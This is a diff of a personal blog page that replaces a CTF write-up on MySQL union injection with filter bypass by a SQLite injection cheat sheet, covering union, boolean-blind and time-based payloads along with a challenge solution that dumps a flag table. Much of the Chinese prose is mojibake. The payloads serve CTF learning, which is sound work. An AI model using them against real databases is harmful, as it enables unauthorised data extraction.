@@ -19,22 +19,22 @@
   <meta name="author" content="aidemofashi">
   <meta name="keywords" content="">
   
-    <meta name="description" content="[SWPUCTF 2022 新生赛]ez_sql题目说参数为nss，get传nss&#x3D;1提示要用更安全的传参法，那就post了post: 12nss&#x3D;1&#x27;  &#x2F;&#x2F;报错nss&#x3D;1&#x27;#  &#x2F;&#x2F;成功闭合 用联合注入发现被过滤了union，空格双写绕过即可爆字段payload 1nss&#x3D;&#x27; uunionnion&#x2F;**&#x2F;select&#x2F;**&#x2F;1,database(),gr">
+    <meta name="description" content="sqliteע������һ����Ŀ[GHCTF 2025]SQL???��֪����sqlite����¼һ��sqlite��ôע��   ʲô��sqliteSQLite��һ�������ڵĿ⣬ʵ�����Ը�����ġ��޷������ġ������õġ������Ե� SQL ���ݿ����档����һ�������õ����ݿ⣬����ζ�����������ݿⲻһ�������">
 <meta property="og:type" content="article">
-<meta property="og:title" content="note-nssctf-01">
-<meta property="og:url" content="https://aidemofashi.github.io/2025/03/17/note-nssctf-01/index.html">
+<meta property="og:title" content="sqlite">
+<meta property="og:url" content="https://aidemofashi.github.io/2025/03/18/sqlite/index.html">
 <meta property="og:site_name" content="aidemofashi&#39;s blog">
-<meta property="og:description" content="[SWPUCTF 2022 新生赛]ez_sql题目说参数为nss，get传nss&#x3D;1提示要用更安全的传参法，那就post了post: 12nss&#x3D;1&#x27;  &#x2F;&#x2F;报错nss&#x3D;1&#x27;#  &#x2F;&#x2F;成功闭合 用联合注入发现被过滤了union，空格双写绕过即可爆字段payload 1nss&#x3D;&#x27; uunionnion&#x2F;**&#x2F;select&#x2F;**&#x2F;1,database(),gr">
+<meta property="og:description" content="sqliteע������һ����Ŀ[GHCTF 2025]SQL???��֪����sqlite����¼һ��sqlite��ôע��   ʲô��sqliteSQLite��һ�������ڵĿ⣬ʵ�����Ը�����ġ��޷������ġ������õġ������Ե� SQL ���ݿ����档����һ�������õ����ݿ⣬����ζ�����������ݿⲻһ�������">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-03-17T14:01:05.000Z">
-<meta property="article:modified_time" content="2025-03-17T14:19:41.023Z">
+<meta property="article:published_time" content="2025-03-18T11:57:51.000Z">
+<meta property="article:modified_time" content="2025-03-18T12:05:00.463Z">
 <meta property="article:author" content="aidemofashi">
-<meta property="article:tag" content="nssctf">
+<meta property="article:tag" content="notice">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>note-nssctf-01 - aidemofashi&#39;s blog</title>
+  <title>sqlite - aidemofashi&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -200,7 +200,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="note-nssctf-01"></span>
+            <span id="subtitle" data-typed-text="sqlite"></span>
           
         </div>
 
@@ -211,8 +211,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-03-17 22:01" pubdate>
-          2025年3月17日 晚上
+        <time datetime="2025-03-18 19:57" pubdate>
+          2025年3月18日 晚上
         </time>
       </span>
     
@@ -223,7 +223,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          89 字
+          265 字
         
       </span>
     
@@ -234,7 +234,7 @@
         
         
         
-          1 分钟
+          3 分钟
         
       </span>
     
@@ -271,16 +271,18 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">note-nssctf-01</h1>
+            <h1 id="seo-header">sqlite</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="SWPUCTF-2022-新生赛-ez-sql"><a href="#SWPUCTF-2022-新生赛-ez-sql" class="headerlink" title="[SWPUCTF 2022 新生赛]ez_sql"></a>[SWPUCTF 2022 新生赛]ez_sql</h1><p>题目说参数为nss，get传nss&#x3D;1<br>提示要用更安全的传参法，那就post了<br>post:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">nss=<span class="hljs-number">1</span><span class="hljs-string">&#x27;  //报错</span><br><span class="hljs-string">nss=1&#x27;</span><span class="hljs-comment">#  //成功闭合</span><br></code></pre></td></tr></table></figure>
-<p>用联合注入发现被过滤了union，空格<br>双写绕过即可<br>爆字段payload</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">nss=<span class="hljs-string">&#x27; uunionnion/**/select/**/1,database(),group_concat(column_name)from/**/infoorrmation_schema.columns/**/where/**/table_name=&#x27;</span>NSS_tb<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure>
-<p>到这步就差不多了</p>
+                <h1 id="sqliteע��"><a href="#sqliteע��" class="headerlink" title="sqliteע��"></a>sqliteע��</h1><p>����һ����Ŀ<br>[GHCTF 2025]SQL???<br>��֪����sqlite����¼һ��sqlite��ôע��  </p>
+<p>ʲô��sqlite<br>SQLite��һ�������ڵĿ⣬ʵ�����Ը�����ġ��޷������ġ������õġ������Ե� SQL ���ݿ����档����һ�������õ����ݿ⣬����ζ�����������ݿⲻһ����������Ҫ��ϵͳ�����á�<br>�����������ݿ⣬SQLite ���治��һ�������Ľ��̣����԰�Ӧ�ó���������о�̬��̬���ӡ�SQLite ֱ�ӷ�����洢�ļ���</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#��ѯ�ֶ���</span><br>-<span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,3;</span><br><span class="hljs-string">1&#x27;</span> order by <span class="hljs-number">3</span>;<br><span class="hljs-comment">#��汾</span><br><span class="hljs-number">0</span><span class="hljs-string">&#x27; union select 1,2,sqlite_version();</span><br><span class="hljs-string">#��ѯ���������� ͨ����ѯ sqlite_master ����ʵ�֣�</span><br><span class="hljs-string">-1&#x27;</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(select sql <span class="hljs-keyword">from</span> sqlite_master limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>;<br><span class="hljs-comment">#�����ڶ����ʱ�����ǿ����� limit �ؼ������ж�ȡ��Ҳ����ʹ�� group_concat �ؼ��ֽ��оۺϣ�</span><br>-<span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,(select group_concat(sql) from sqlite_master),4;</span><br><span class="hljs-string">0&#x27;</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,tbl_name FROM sqlite_master  limit <span class="hljs-number">2</span> offset <span class="hljs-number">1</span> --<br><span class="hljs-comment">#��ѯ����</span><br>-<span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,(select group_concat(username,password) from table_name),4;</span><br><span class="hljs-string"></span><br><span class="hljs-string">����äע</span><br><span class="hljs-string">#���ݲ�ѯ��ȷ�����ʱ��ҳ��������ж��������ݣ� </span><br><span class="hljs-string">-1&#x27;</span> <span class="hljs-keyword">or</span> length(sqlite_version())=<span class="hljs-number">5</span>/*<br>-<span class="hljs-number">1</span><span class="hljs-string">&#x27; or length(sqlite_version())=6/*</span><br><span class="hljs-string"></span><br><span class="hljs-string">-1&#x27;</span> <span class="hljs-keyword">or</span> substr((select group_concat(sql) <span class="hljs-keyword">from</span> sqlite_master),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;a&#x27;</span>/*<br>-<span class="hljs-number">1</span><span class="hljs-string">&#x27; or substr((select group_concat(sql) from sqlite_master),1,1)&lt;&#x27;</span>a<span class="hljs-string">&#x27;/*</span><br><span class="hljs-string">-1&#x27;</span> <span class="hljs-keyword">or</span> substr((select group_concat(sql) <span class="hljs-keyword">from</span> sqlite_master),<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;b&#x27;</span>/*<br>-<span class="hljs-number">1</span><span class="hljs-string">&#x27; or substr((select group_concat(sql) from sqlite_master),2,1)&lt;&#x27;</span><span class="hljs-string">b&#x27;/*</span><br><span class="hljs-string">-1&#x27;</span> <span class="hljs-keyword">or</span> substr((select group_concat(sql) <span class="hljs-keyword">from</span> sqlite_master),<span class="hljs-number">3</span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;C&#x27;</span>/*<br>-<span class="hljs-number">1</span><span class="hljs-string">&#x27; or substr((select group_concat(sql) from sqlite_master),3,1)&lt;&#x27;</span>C<span class="hljs-string">&#x27;/*</span><br><span class="hljs-string">......</span><br><span class="hljs-string"></span><br><span class="hljs-string">ʱ��äע</span><br><span class="hljs-string">#QLite û�� sleep() �����������и� randomblob(N) �������������Ƿ���һ�� N �ֽڳ��İ���α����ֽڵ� BLOG�� N ��������������������������ʱ��</span><br><span class="hljs-string">���� SQLite û�� if������������Ҫʹ�� case...when �������ѯ��䣺</span><br><span class="hljs-string">-1&#x27;</span> <span class="hljs-keyword">or</span> (<span class="hljs-keyword">case</span> when(substr(sqlite_version(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;3&#x27;</span>) then randomblob(<span class="hljs-number">1000000000</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> end)/*<br><br>by<br><br>https://blog.csdn.net/<span class="hljs-number">2201_75824562</span>/article/details/<span class="hljs-number">139362754</span><br></code></pre></td></tr></table></figure>
+
+<p>����ԭ���payload</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span> //���Ի���<br><br>?id=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-keyword">sql</span>) <span class="hljs-keyword">from</span> sqlite_master) //�����Ϳ���ֱ�Ӳ�ѯ�������ֶ���<br>���ԣ�<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> &quot;flag&quot; ( &quot;flag&quot; <span class="hljs-type">TEXT</span> ),<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> &quot;users&quot; ( &quot;id&quot; <span class="hljs-type">INTEGER</span>, &quot;username&quot; <span class="hljs-type">TEXT</span>, &quot;email&quot; <span class="hljs-type">TEXT</span>, &quot;phone&quot; <span class="hljs-type">TEXT</span>, &quot;address&quot; <span class="hljs-type">TEXT</span> )<br><br>?id=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,(<span class="hljs-keyword">select</span> group_concat(flag) <span class="hljs-keyword">from</span> flag)<br>//�õ�flag<br></code></pre></td></tr></table></figure>
+<p>û�����ˣ�������ע�룬��������������ʶsqlite����Ŀ�ɕ0�7</p>
 
                 
               </div>
@@ -293,7 +295,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/nssctf/" class="print-no-link">#nssctf</a>
+        <a href="/tags/notice/" class="print-no-link">#notice</a>
       
     </div>
   
@@ -305,8 +307,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>note-nssctf-01</div>
-      <div>https://aidemofashi.github.io/2025/03/17/note-nssctf-01/</div>
+      <div>sqlite</div>
+      <div>https://aidemofashi.github.io/2025/03/18/sqlite/</div>
     </div>
     <div class="license-meta">
       
@@ -318,7 +320,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年3月17日</div>
+          <div>2025年3月18日</div>
         </div>
       
       
@@ -350,18 +352,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/03/18/sqlite/" title="sqlite">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">sqlite</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/03/16/note-14/" title="note-14">
-                        <span class="hidden-mobile">note-14</span>
+                      <a href="/2025/03/17/note-nssctf-01/" title="note-nssctf-01">
+                        <span class="hidden-mobile">note-nssctf-01</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
